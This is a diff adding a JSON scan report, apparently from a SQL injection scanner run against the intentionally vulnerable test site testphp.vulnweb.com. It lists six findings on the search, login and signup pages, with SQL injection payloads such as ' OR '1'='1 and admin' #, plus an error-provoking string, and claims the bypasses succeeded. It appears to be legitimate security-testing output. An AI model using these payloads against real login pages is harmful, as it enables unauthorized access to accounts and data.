@@ -1,0 +1,44 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com/",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://testphp.vulnweb.com/search.php?test=query using payload: ' OR '1'='1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/",
+        "vulnerability type": "Error Based SQLI",
+        "payload": "<>\"'%;)(&+",
+        "severity": "Critical",
+        "evidence": "Server error by http://testphp.vulnweb.com/"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/login.php",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://testphp.vulnweb.com/userinfo.php using payload: ' OR '1'='1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/login.php",
+        "vulnerability type": "Error Based SQLI",
+        "payload": "<>\"'%;)(&+",
+        "severity": "Critical",
+        "evidence": "Server error by http://testphp.vulnweb.com/login.php"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/signup.php",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "admin' #",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://testphp.vulnweb.com/secured/newuser.php using payload: admin' #"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/signup.php",
+        "vulnerability type": "Error Based SQLI",
+        "payload": "<>\"'%;)(&+",
+        "severity": "Critical",
+        "evidence": "Server error by http://testphp.vulnweb.com/signup.php"
+    }
+]
